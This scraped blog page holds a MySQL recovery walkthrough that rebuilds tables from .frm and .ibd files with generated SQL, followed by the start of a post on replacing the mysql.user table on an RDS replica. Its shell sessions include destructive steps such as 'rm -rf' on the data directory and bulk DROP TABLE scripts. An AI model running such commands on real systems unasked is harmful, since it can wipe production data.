1 mysql mysql 9058 Aug 14 2017 prod_coin_rpt.frm-rw-r--r-- 1 mysql mysql 9437184 May 15 14:24 prod_coin_rpt.ibd-rw-r--r-- 1 mysql mysql 8798 Aug 14 2017 prod_coin_rpt_log.frm-rw-r--r-- 1 mysql mysql 98304 May 15 14:24 prod_coin_rpt_log.ibd-rw-r--r-- 1 mysql mysql 9834 Dec 13 14:12 prod.frm-rw-r--r-- 1 mysql mysql 8835 Aug 14 2017 prod_gprs_bind.frm-rw-r--r-- 1 mysql mysql 8793 Aug 14 2017 prod_gprs_bind_his.frm-rw-r--r-- 1 mysql mysql 196608 May 15 09:42 prod_gprs_bind_his.ibd-rw-r--r-- 1 mysql mysql 98304 Aug 14 2017 prod_gprs_bind.ibd-rw-r--r-- 1 mysql mysql 425984 May 15 09:42 prod.ibd-rw-r--r-- 1 mysql mysql 8851 Aug 14 2017 prod_instl_imgs.frm-rw-r--r-- 1 mysql mysql 98304 Aug 14 2017 prod_instl_imgs.ibd-rw-r--r-- 1 mysql mysql 9388 Dec 13 14:13 prod_instl_pos.frm-rw-r--r-- 1 mysql mysql 147456 May 15 16:25 prod_instl_pos.ibd-rw-r--r-- 1 mysql mysql 9384 Dec 13 14:14 prod_instl_pos_model.frm-rw-r--r-- 1 mysql mysql 131072 May 15 16:24 prod_instl_pos_model.ibd-rw-r--r-- 1 mysql mysql 8892 Aug 14 2017 prod_mod_attr.frm-rw-r--r-- 1 mysql mysql 98304 Aug 14 2017 prod_mod_attr.ibd-rw-r--r-- 1 mysql mysql 8873 Aug 14 2017 prod_mod_attr_val.frm-rw-r--r-- 1 mysql mysql 98304 Aug 14 2017 prod_mod_attr_val.ibd-rw-r--r-- 1 mysql mysql 9642 Dec 13 14:11 prod_model.frm-rw-r--r-- 1 mysql mysql 98304 May 11 11:58 prod_model.ibd-rw-r--r-- 1 mysql mysql 8815 Aug 14 2017 prod_mod_sku.frm-rw-r--r-- 1 mysql mysql 98304 Aug 14 2017 prod_mod_sku.ibd-rw-r--r-- 1 mysql mysql 9050 Aug 14 2017 prod_onl_log.frm-rw-r--r-- 1 mysql mysql 163840 May 15 18:42 prod_onl_log.ibd-rw-r--r-- 1 mysql mysql 9143 Aug 14 2017 prod_sp_args.frm-rw-r--r-- 1 mysql mysql 98304 Aug 14 2017 prod_sp_args.ibd-rw-r--r-- 1 mysql mysql 8876 Aug 14 2017 prod_sp_arg_vals.frm-rw-r--r-- 1 mysql mysql 98304 Aug 14 2017 prod_sp_arg_vals.ibd-rw-r--r-- 1 mysql mysql 9190 Dec 13 14:14 sys_acct.frm-rw-r--r-- 1 mysql mysql 98304 May 14 11:16 sys_acct.ibd-rw-r--r-- 1 mysql mysql 8776 Aug 14 2017 sys_acct_res.frm-rw-r--r-- 1 mysql mysql 229376 May 11 11:52 sys_acct_res.ibd-rw-r--r-- 1 mysql mysql 9106 Aug 14 2017 sys_res.frm-rw-r--r-- 1 mysql mysql 98304 Aug 14 2017 sys_res.ibd#获取待恢复表名[root@toberoot cy02]# ll *.frm |awk &apos;{print $9}&apos;|awk -F &apos;.&apos; &apos;{print $1}&apos; &gt; /alidata/cy_table.txt# python脚本自动生成建表语句[root@toberoot alidata]# cat py_createtable01.py #-*- coding : utf8 -*-def create_table_test(table_file,sql_file): a_file = open(sql_file,&apos;w&apos;) b_file = open(table_file) b_list = b_file.readlines() for table in b_list: string = &quot;create table {} (id int);&quot;.format(table) a_file.write(string) a_file.close() if __name__ == &apos;__main__&apos;: create_table_test(&apos;/alidata/cy_table.txt&apos;,&apos;/alidata/cy_sql1.sql&apos;)[root@toberoot alidata]# python /alidata/py_createtable01.py [root@toberoot alidata]# head /alidata/cy_sql1.sql create table base_dict (id int);create table biz_advise (id int);create table biz_bank (id int);create table biz (id int);create table biz_gift (id int);create table biz_gprs_bind (id int);create table biz_gprs_bind_his (id int);create table biz_msg_template (id int);create table biz_take_bank (id int);create table biz_take省略。。。# 导入测试表结构[root@toberoot alidata]# mysql -e &quot;show databases&quot;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || sys |+--------------------+[root@toberoot alidata]# mysql -e &quot;create database cy;&quot;[root@toberoot alidata]# mysql cy &lt; /alidata/cy_sql1.sql [root@toberoot alidata]# mysql -e &quot;desc cy.sys_res&quot;+-------+---------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+---------+------+-----+---------+-------+| id | int(11) | YES | | NULL | |+-------+---------+------+-----+---------+-------+# 开始获取表结构中列的信息[root@toberoot alidata]# service mysqld stopShutting down MySQL.. [ OK ][root@toberoot alidata]# yes|cp ~/home/cy02/*.frm /alidata/mysql/data/cy/cp: overwrite ‘/alidata/mysql/data/cy/base_dict.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_advise.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_bank.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_gift.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_gprs_bind.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_gprs_bind_his.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_msg_template.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_take_bank.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_take.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_take_wwlt.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_take_wx.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_vip.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_wlt.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_wx_focus.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_wx.frm’? cp: overwrite ‘/alidata/mysql/data/cy/biz_wx_walt.frm’? cp: overwrite ‘/alidata/mysql/data/cy/cfg_area.frm’? cp: overwrite ‘/alidata/mysql/data/cy/cfg_id_gen.frm’? cp: overwrite ‘/alidata/mysql/data/cy/gprs_model.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_coin_chged.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_coin.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_oauth.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_pay.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_prizen.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_recharge.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_wallet_chged.frm’? cp: overwrite ‘/alidata/mysql/data/cy/mbr_wallet.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord_item.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord_pay_ali.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord_pay_coin.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord_pay_return.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord_pay_wlt.frm’? cp: overwrite ‘/alidata/mysql/data/cy/ord_pay_wx.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_base_args.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_bug_rpt.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_cmd.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_cmd_invoke.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_coin_rpt.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_coin_rpt_log.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_gprs_bind.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_gprs_bind_his.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_instl_imgs.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_instl_pos.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_instl_pos_model.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_mod_attr.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_mod_attr_val.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_model.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_mod_sku.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_onl_log.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_sp_args.frm’? cp: overwrite ‘/alidata/mysql/data/cy/prod_sp_arg_vals.frm’? cp: overwrite ‘/alidata/mysql/data/cy/sys_acct.frm’? cp: overwrite ‘/alidata/mysql/data/cy/sys_acct_res.frm’? cp: overwrite ‘/alidata/mysql/data/cy/sys_res.frm’? [root@toberoot alidata]# [root@toberoot alidata]# cat py_createtable01.py #-*- coding : utf8 -*-def create_table_test(table_file,sql_file): a_file = open(sql_file,&apos;w&apos;) b_file = open(table_file) b_list = b_file.readlines() for table in b_list: string = &quot;create table {} (id int);&quot;.format(table) a_file.write(string) a_file.close() def desc_table_test(table_file,sql_file): a_file = open(sql_file,&apos;w&apos;) b_file = open(table_file) b_list = b_file.readlines() for table in b_list: string = &quot;desc {};&quot;.format(table) a_file.write(string) a_file.close()if __name__ == &apos;__main__&apos;: #create_table_test(&apos;/alidata/cy_table.txt&apos;,&apos;/alidata/cy_sql1.sql&apos;) desc_table_test(&apos;/alidata/cy_table.txt&apos;,&apos;/alidata/cy_sql2.sql&apos;)[root@toberoot alidata]# python py_createtable01.py[root@toberoot alidata]# head cy_sql2.sql desc base_dict;desc biz_advise;desc biz_bank;desc biz;desc biz_gift;desc biz_gprs_bind;desc biz_gprs_bind_his;desc biz_msg_template;desc biz_take_bank;desc biz_take# 截取包含列名的报错[root@toberoot alidata]# grep contains mysql/dataerror.log &gt; cy_error1.log# 报错格式如下：2018-05-17T07:58:32.926555Z 3 [Warning] InnoDB: Table cy/base_dict contains 1 user defined columns in InnoDB, but 11 columns in MySQL. Please check INFORMATION_SCHEMA.INNODB_SYS_COLUMNS and http://dev.mysql.com/doc/refman/5.7/en/innodb-troubleshooting.html for how to resolve the issue.2018-05-17T07:59:03.555492Z 4 [Warning] InnoDB: Table cy/biz_advise contains 1 user defined columns in InnoDB, but 7 columns in MySQL. Please check INFORMATION_SCHEMA.INNODB_SYS_COLUMNS and http://dev.mysql.com/doc/refman/5.7/en/innodb-troubleshooting.html for how to resolve the issue.2018-05-17T07:59:03.556045Z 4 [Warning] InnoDB: Table cy/biz_bank contains 1 user defined columns in InnoDB, but 7 columns in MySQL. Please check INFORMATION_SCHEMA.INNODB_SYS_COLUMNS and http://dev.mysql.com/doc/refman/5.7/en/innodb-troubleshooting.html for how to resolve the issue.# 将表名和列数存放至文件中[root@toberoot alidata]# awk &apos;{print $6,$15}&apos; cy_error1.log | awk -F &apos;/&apos; &apos;{print $2}&apos; &gt; cy_table_col.txt# 根据以上表名和列数生成新的测试表def create_table_col(table_col_file,sql_file): a_file = open(sql_file,&apos;w&apos;) b_file = open(table_col_file) b_list = b_file.readlines() # b_list = [&apos;t1 10&apos;,&apos;t2 20&apos;] str_list = [] for table_col_str in b_list: table_col_list = table_col_str.split() table = table_col_list[0] col = int(table_col_list[1]) string = &quot;create table {} (&quot;.format(table) str_list.append(string) for i in range(1,col+1): if i!=col: string = &apos;id{} int,&apos;.format(i) else: string = &apos;id{} int);&apos;.format(i) str_list.append(string) for line in str_list: a_file.write(line) a_file.close()create_table_col(&apos;/alidata/cy_table_col.txt&apos;,&apos;/alidata/cy_sql3.sql&apos;)# 删除这些测试表[root@toberoot alidata]# vim py_createtable01.py [root@toberoot alidata]# python py_createtable01.py [root@toberoot alidata]# lltotal 60-rw-r--r-- 1 root root 16729 May 17 16:00 cy_error1.log-rw-r--r-- 1 root root 2033 May 17 15:12 cy_sql1.sql-rw-r--r-- 1 root root 1047 May 17 15:56 cy_sql2.sql-rw-r--r-- 1 root root 6353 May 17 16:15 cy_sql3.sql-rw-r--r-- 1 root root 1395 May 17 16:17 cy_sql4.sql-rw-r--r-- 1 root root 837 May 17 16:03 cy_table_col.txt-rw-r--r-- 1 root root 699 May 17 15:56 cy_table.txtdrwxr-xr-x 3 root root 4096 May 17 12:12 installdrwxr-xr-x 11 mysql mysql 4096 May 17 15:44 mysql-rw-r--r-- 1 root root 1798 May 17 16:17 py_createtable01.py#python代码如下：def drop_table_test(table_file,sql_file): a_file = open(sql_file,&apos;w&apos;) b_file = open(table_file) b_list = b_file.readlines() for table in b_list: string = &quot;drop table {};&quot;.format(table) a_file.write(string) a_file.close()drop_table_test(&apos;/alidata/cy_table.txt&apos;,&apos;/alidata/cy_sql4.sql&apos;) [root@toberoot alidata]# head /alidata/cy_sql4.sql drop table base_dict;drop table biz_advise;drop table biz_bank;drop table biz;drop table biz_gift;drop table biz_gprs_bind;drop table biz_gprs_bind_his;drop table biz_msg_template;drop table biz_take_bank;drop table biz_take#删除数据库的时候直接卡死了，原因未知。也没有报错。#清数据启动服务ln: failed to create symbolic link ‘/usr/local/mysql/bin/mysqld’: File existsStarting MySQL. [ OK ][root@toberoot ~]# mysql -e &apos;create database cy&apos;# 开始尝试获取表的结构[root@toberoot alidata]# mysql cy &lt; cy_sql3.sql[root@toberoot alidata]# service mysqld stopShutting down MySQL.. [ OK ][root@toberoot alidata]# cp ~/home/cy02/*.frm /alidata/mysql/data/cy/ -pcp: overwrite ‘/alidata/mysql/data/cy/base_dict.frm’? ^C[root@toberoot alidata]# yes | cp ~/home/cy02/*.frm /alidata/mysql/data/cy/ -p[root@toberoot alidata]# ll /alidata/mysql/data/cy/sys_res*-rw-r--r-- 1 mysql mysql 9106 Aug 14 2017 /alidata/mysql/data/cy/sys_res.frm-rw-r----- 1 mysql mysql 98304 May 17 16:44 /alidata/mysql/data/cy/sys_res.ibd# 配置文件[mysqld]innodb_force_recovery=6[root@toberoot alidata]# vim /etc/my.cnf[root@toberoot alidata]# service mysqld startStarting MySQL. [ OK ]# 表结构成功获取[root@toberoot alidata]# mysql cy -e &apos;desc sys_res&apos;+--------+--------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+--------+--------------+------+-----+---------+-------+| ID | varchar(64) | NO | PRI | NULL | || NAME | varchar(32) | NO | | NULL | || CODE | varchar(128) | NO | | NULL | || URI | varchar(128) | NO | | NULL | || LOGO | varchar(64) | YES | | NULL | || TYPE | int(11) | NO | | NULL | || PCODE | varchar(64) | YES | | NULL | || SORT | int(11) | YES | | 0 | || STATE | int(11) | NO | | NULL | || ADMIN | int(11) | YES | | 0 | || REMARK | varchar(64) | YES | | NULL | || CRTIME | datetime | NO | | NULL | || UPTIME | datetime | NO | | NULL | |+--------+--------------+------+-----+---------+-------+root@MySQL-01 16:49: [(none)]&gt; select table_name,table_schema from information_schema.tables where table_schema=&apos;cy&apos;;+----------------------+--------------+| table_name | table_schema |+----------------------+--------------+| base_dict | cy || biz | cy || biz_advise | cy || biz_bank | cy || biz_gift | cy || biz_gprs_bind | cy || biz_gprs_bind_his | cy || biz_msg_template | cy || biz_take | cy || biz_take_bank | cy || biz_take_wwlt | cy || biz_take_wx | cy || biz_vip | cy || biz_wlt | cy || biz_wx | cy || biz_wx_focus | cy || biz_wx_walt | cy || cfg_area | cy || cfg_id_gen | cy || gprs_model | cy || mbr | cy || mbr_coin | cy || mbr_coin_chged | cy || mbr_oauth | cy || mbr_pay | cy || mbr_prizen | cy || mbr_recharge | cy || mbr_wallet | cy || mbr_wallet_chged | cy || ord | cy || ord_item | cy || ord_pay_ali | cy || ord_pay_coin | cy || ord_pay_return | cy || ord_pay_wlt | cy || ord_pay_wx | cy || prod | cy || prod_base_args | cy || prod_bug_rpt | cy || prod_cmd | cy || prod_cmd_invoke | cy || prod_coin_rpt | cy || prod_coin_rpt_log | cy || prod_gprs_bind | cy || prod_gprs_bind_his | cy || prod_instl_imgs | cy || prod_instl_pos | cy || prod_instl_pos_model | cy || prod_mod_attr | cy || prod_mod_attr_val | cy || prod_mod_sku | cy || prod_model | cy || prod_onl_log | cy || prod_sp_arg_vals | cy || prod_sp_args | cy || sys_acct | cy || sys_acct_res | cy || sys_res | cy |+----------------------+--------------+58 rows in set (0.00 sec)# 58张表dump备份出来[root@toberoot alidata]# mysqldump -B cy -d &gt; /alidata/new_yc_ddl.sql[root@toberoot alidata]# tail -n 30 /alidata/new_yc_ddl.sql /*!40101 SET @saved_cs_client = @@character_set_client */;/*!40101 SET character_set_client = utf8 */;CREATE TABLE `sys_res` ( `ID` varchar(64) NOT NULL COMMENT &apos;ID&apos;, `NAME` varchar(32) NOT NULL COMMENT &apos;菜单名称&apos;, `CODE` varchar(128) NOT NULL COMMENT &apos;菜单编码&apos;, `URI` varchar(128) NOT NULL COMMENT &apos;URI&apos;, `LOGO` varchar(64) DEFAULT NULL COMMENT &apos;图标&apos;, `TYPE` int(11) NOT NULL COMMENT &apos;@菜单类型（1菜单；2按钮）&apos;, `PCODE` varchar(64) DEFAULT NULL COMMENT &apos;父菜单&apos;, `SORT` int(11) DEFAULT &apos;0&apos; COMMENT &apos;排序&apos;, `STATE` int(11) NOT NULL COMMENT &apos;@@状态（0 无效；1 正常）&apos;, `ADMIN` int(11) DEFAULT &apos;0&apos; COMMENT &apos;是否管理员菜单（默认0否）&apos;, `REMARK` varchar(64) DEFAULT NULL COMMENT &apos;备注&apos;, `CRTIME` datetime NOT NULL COMMENT &apos;CRTIME&apos;, `UPTIME` datetime NOT NULL COMMENT &apos;UPTIME&apos;, PRIMARY KEY (`ID`)) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT=&apos;权限_系统资源&apos;;/*!40101 SET character_set_client = @saved_cs_client */;/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;-- Dump completed on 2018-05-17 16:52:28# discard和import命令def discard_table_test(table_file,sql_file): a_file = open(sql_file,&apos;w&apos;) b_file = open(table_file) b_list = b_file.readlines() for table in b_list: string = &quot;alter table {} discard tablespace;&quot;.format(table) a_file.write(string) a_file.close() def import_table_test(table_file,sql_file): a_file = open(sql_file,&apos;w&apos;) b_file = open(table_file) b_list = b_file.readlines() for table in b_list: string = &quot;alter table {} import tablespace;&quot;.format(table) a_file.write(string) a_file.close() discard_table_test(&apos;/alidata/cy_table.txt&apos;,&apos;/alidata/cy_sql5.sql&apos;)import_table_test(&apos;/alidata/cy_table.txt&apos;,&apos;/alidata/cy_sql6.sql&apos;) # 生成sql[root@toberoot alidata]# python py_createtable01.py [root@toberoot alidata]# lltotal 124-rw-r--r-- 1 root root 16729 May 17 16:00 cy_error1.log-rw-r--r-- 1 root root 2033 May 17 15:12 cy_sql1.sql-rw-r--r-- 1 root root 1047 May 17 15:56 cy_sql2.sql-rw-r--r-- 1 root root 6353 May 17 16:15 cy_sql3.sql-rw-r--r-- 1 root root 1395 May 17 16:17 cy_sql4.sql-rw-r--r-- 1 root root 2033 May 17 16:55 cy_sql5.sql-rw-r--r-- 1 root root 2033 May 17 16:55 cy_sql6.sql-rw-r--r-- 1 root root 837 May 17 16:03 cy_table_col.txt-rw-r--r-- 1 root root 699 May 17 15:56 cy_table.txtdrwxr-xr-x 3 root root 4096 May 17 16:41 installdrwxr-xr-x 11 mysql mysql 4096 May 17 16:47 mysql-rw-r--r-- 1 root root 57068 May 17 16:52 new_yc_ddl.sql-rw-r--r-- 1 root root 2489 May 17 16:55 py_createtable01.py[root@toberoot alidata]# head /alidata/cy_sql5.sql alter table base_dict discard tablespace;alter table biz_advise discard tablespace;alter table biz_bank discard tablespace;alter table biz discard tablespace;alter table biz_gift discard tablespace;alter table biz_gprs_bind discard tablespace;alter table biz_gprs_bind_his discard tablespace;alter table biz_msg_template discard tablespace;alter table biz_take_bank discard tablespace;alter table biz_take[root@toberoot alidata]# head /alidata/cy_sql6.sql alter table base_dict import tablespace;alter table biz_advise import tablespace;alter table biz_bank import tablespace;alter table biz import tablespace;alter table biz_gift import tablespace;alter table biz_gprs_bind import tablespace;alter table biz_gprs_bind_his import tablespace;alter table biz_msg_template import tablespace;alter table biz_take_bank import tablespace;alter table biz_take[root@toberoot alidata]# mysql cy &lt; cy_sql5.sqlERROR 1036 (HY000) at line 1: Table &apos;base_dict&apos; is read only[root@toberoot alidata]# vim /etc/my.cnf[root@toberoot alidata]# service mysqld restartShutting down MySQL.. [ OK ]Starting MySQL. [ OK ][root@toberoot alidata]# vim /etc/my.cnf[root@toberoot alidata]# mysql cy &lt; cy_sql5.sql[root@toberoot alidata]# cp /root/home/cy02/*.ibd /alidata/mysql/data/cy/ -rp[root@toberoot alidata]# mysql cy &lt; cy_sql6.sqlERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query[root@toberoot alidata]# vim /etc/my.cnf[root@toberoot alidata]# service mysqld restartShutting down MySQL.. [ OK ]Starting MySQL. [ OK ][root@toberoot alidata]# mysql cy &lt; cy_sql6.sqlERROR 1036 (HY000) at line 1: Table &apos;base_dict&apos; is read only[root@toberoot alidata]# service mysqld stopShutting down MySQL.. [ OK ][root@toberoot alidata]# rm -rf /alidata/mysql/data/*[root@toberoot alidata]# service mysqld startStarting MySQL. [ OK ][root@toberoot alidata]# mysql &lt; new_yc_ddl.sql [root@toberoot alidata]# mysql -e &apos;use cy;select * from sys_res&apos;开启强制恢复参数[root@toberoot alidata]# vim /etc/my.cnf[root@toberoot alidata]# mysql cy &lt; cy_sqlcy_sql1.sql cy_sql2.sql cy_sql3.sql cy_sql4.sql cy_sql5.sql cy_sql6.sql [root@toberoot alidata]# mysql cy &lt; cy_sql5.sql [root@toberoot alidata]# cp /root/home/cy02/*.ibd /alidata/mysql/data/cy/ -rp[root@toberoot alidata]# mysql cy &lt; cy_sql6.sql# 全备份数据[root@toberoot alidata]# mysqldump -B cy &gt; new_cy_all.sql# 查看备份的数据量-rw-r--r-- 1 root root 26M May 17 17:13 new_cy_all.sql 报错汇总ERROR 1036 （HY00）12[root@toberoot alidata]# mysql cy &lt; cy_sql5.sqlERROR 1036 (HY000) at line 1: Table &apos;base_dict&apos; is read only 解决方法： 检查是否配置文件中存在innodb_force_recovery参数 如果存在去除或注释掉，重启服务即可 还不行就清空数据库导入结构后再继续 ERROR 2013 (HY000)12[root@toberoot alidata]# mysql cy &lt; cy_sql6.sqlERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query 解决方法： sql脚本中执行import tablespace的操作需要开启recovery的参数 重启服务 在客户服务上，执行以上操作还是报错无法连接，尝试多次都不行。 总结这次case的教训就是，备份！一定要有周期性的有效备份！ 欺骗MySQL进程蒙混过关只能是没办法的办法，而且不能保证成功率。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778# -*- coding : utf8 -*-# py_createtable01.py# auth： boobooweiclass mysql_tools(): def __init__(self, in_file): self.b_list = open(in_file).readlines() def create_table_test(self, sql_file): a_file = open(sql_file, &apos;w&apos;) for table in self.b_list: string = &quot;create table {} (id int);&quot;.format(table) a_file.write(string) a_file.close() def desc_table_test(self, sql_file): a_file = open(sql_file, &apos;w&apos;) for table in self.b_list: string = &quot;desc {};&quot;.format(table) a_file.write(string) a_file.close() def create_table_col(self, sql_file): a_file = open(sql_file, &apos;w&apos;) str_list = [] for table_col_str in self.b_list: table_col_list = table_col_str.split() table = table_col_list[0] col = int(table_col_list[1]) string = &quot;create table {} (&quot;.format(table) str_list.append(string) for i in range(1, col + 1): if i != col: string = &apos;id{} int,&apos;.format(i) else: string = &apos;id{} int);&apos;.format(i) str_list.append(string) for line in str_list: a_file.write(line) a_file.close() def drop_table_test(self, sql_file): a_file = open(sql_file, &apos;w&apos;) for table in self.b_list: string = &quot;drop table {};&quot;.format(table) a_file.write(string) a_file.close() def discard_table_test(self, sql_file): a_file = open(sql_file, &apos;w&apos;) for table in self.b_list: string = &quot;alter table {} discard tablespace;&quot;.format(table) a_file.write(string) a_file.close() def import_table_test(self, sql_file): a_file = open(sql_file, &apos;w&apos;) for table in self.b_list: string = &quot;alter table {} import tablespace;&quot;.format(table) a_file.write(string) a_file.close()if __name__ == &apos;__main__&apos;: mysql_tools(&apos;/alidata/cy_table.txt&apos;).create_table_test(&apos;/alidata/cy_sql1.sql&apos;) mysql_tools(&apos;/alidata/cy_table.txt&apos;).desc_table_test(&apos;/alidata/cy_sql2.sql&apos;) # 根据以上表名和列数生成新的测试表 mysql_tools(&apos;/alidata/cy_table_col.txt&apos;).create_table_col(&apos;/alidata/cy_sql3.sql&apos;) mysql_tools(&apos;/alidata/cy_table.txt&apos;).drop_table_test(&apos;/alidata/cy_sql4.sql&apos;) mysql_tools(&apos;/alidata/cy_table.txt&apos;).discard_table_test(&apos;/alidata/cy_sql5.sql&apos;) mysql_tools(&apos;/alidata/cy_table.txt&apos;).import_table_test(&apos;/alidata/cy_sql6.sql&apos;)","link":"/2018/05/17/booboo_others/2018-05-16-tec-mysql/"},{"title":"突破阿里限制实现\"RDS For MySQL 5.7到自建MySQL主从\"","text":"摘要: 阿里云的RDS For MySQL 5.7 到线下IDC机房的主从搭建相信看官方文档就可以完成，但是搭建之后却发现无法在本地进行认证权限的管理，这是为何？而阿里官方推荐使用DTS同步工具去实现，这个费用着实不少，又是否能够破解呢？本文详解如何暴力破解user表实现从库用户权限更改功能 故事背景数据库明细说在前面： 云上数据库： RDS For MySQL 5.7.20 普通用户权限 IDC数据库: MySQL 5.7.20 故事情节现需要搭建RDS For MySQL 到线下IDC机房的主从，问题如下： 同步系统表失败故障原因 RDS For MySQL 5.7.20 到自建MySQL 5.7.20主从同步异常的原因为RDS与MySQL官方版本使用的系统库不同 自建MySQL 5.7.20 无法同步主库RDS的系统表 自建MySQL 5.7.20 恢复RDS的全备份数据后无法执行授权语句,报错如下： 1ERROR 1785 (HY000): Statement violates GTID consistency: Updates to non-transactional tables can only be done in either autocommitted statements or single-statement transactions, and never in the same statement as updates to transactional tables. 自建MySQL 5.7.20 恢复RDS的全备份数据后无法对系统表执行更新操作，报错如下： 1ERROR 1064 (42000): Unknown trigger has an error in its body: &apos;Unknown system variable &apos;maintain_user_list&apos;&apos; 解决方法 跳过系统表的同步 从库添加认证授权失败RDS For MySQL 5.7.20 到自建MySQL 5.7.20 搭建主从同步架构: 配置从库不同步RDS主库的系统表 1234# skip repreplicate_wild_ignore_table=mysql.%replicate_wild_ignore_table=sys.%replicate_wild_ignore_table=information_schema.% 非系统库数据同步正常 从库无法执行grant命令，即无法添加授权信息 从库无法对系统表mysql.user表执行insert操作 从库无法对系统表mysql.user表执行updat操作 报错如下： 1ERROR 1064 (42000): Unknown trigger has an error in its body: &apos;Unknown system variable &apos;maintain_user_list&apos;&apos; 失败原因阿里工单答复：RDS 目前已经不支持 MYISAM 引擎创建了。所以如果是通过自建的replication 同步 就会有这个问题的，RDS 统一INNOB 引擎。如果需求是从RDS 到自建数据库的同步关系，建议您使用DTS 做业务数据的同步。 探索解决方法从库尝试使用MySQL8.0.11RDS For MySQL 5.7的备份文件 到线下自建MYSQL 8.0.11 无法恢复数据。因此该方法不可行。 尝试临时关闭GTID模式 临时停止slave同步 修改配置关闭gtid模式 重启服务 对系统表mysql.user测试明细： No. 测试项目 结果 1 是否能够执行grant命令 × 2 是否能够执行update命令 × 3 是否能够执行insert命令 × 该方法同样无法解决。 解决方案思路123456# 权限相关的一些表：SCHEMA_PRIVILEGES：提供了数据库的相关权限，这个表是内存表是从mysql.db中拉去出来的。TABLE_PRIVILEGES:提供的是表权限相关信息，信息是从 mysql.tables_priv 表中加载的COLUMN_PRIVILEGES ：这个表可以清楚就能看到表授权的用户的对象，那张表那个库以及授予的是什么权限，如果授权的时候加上with grant option的话，我们可以看得到PRIVILEGE_TYPE这个值必须是YES。USER_PRIVILEGES:提供的是表权限相关信息，信息是从 mysql.user 表中加载的通过表我们可以很清晰看得到MySQL授权的层次，SCHEMA，TABLE，COLUMN级别，当然这些都是基于用户来授予的 从数据库用户权限管理的原理可以了解到管理用户的是user表，如果要更细致的权限还需要db表和tables_priv表。（本文只从user表着手） 步骤概览 创建新的user_1表 对user_1表添加新的用户 停服务 将user_1替换user表 启动该服务 可以通过update、insert、delete操作user表来添加权限（grant无法操作） 测试环境123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145root@MySQL-01 10:35: [mysql]&gt; create table user_1 like user;Query OK, 0 rows affected (0.01 sec)root@MySQL-01 10:36: [mysql]&gt; select * from user_1;Empty set (0.00 sec)root@MySQL-01 10:36: [mysql]&gt; show table status like user;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;user&apos; at line 1root@MySQL-01 10:36: [mysql]&gt; show table status like &apos;user_1&apos;;+--------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+------------+-----------+----------+----------------+-----------------------------+| Name | Engine | Version | Row_format | Rows | Avg_row_length | Data_length | Max_data_length | Index_length | Data_free | Auto_increment | Create_time | Update_time | Check_time | Collation | Checksum | Create_options | Comment 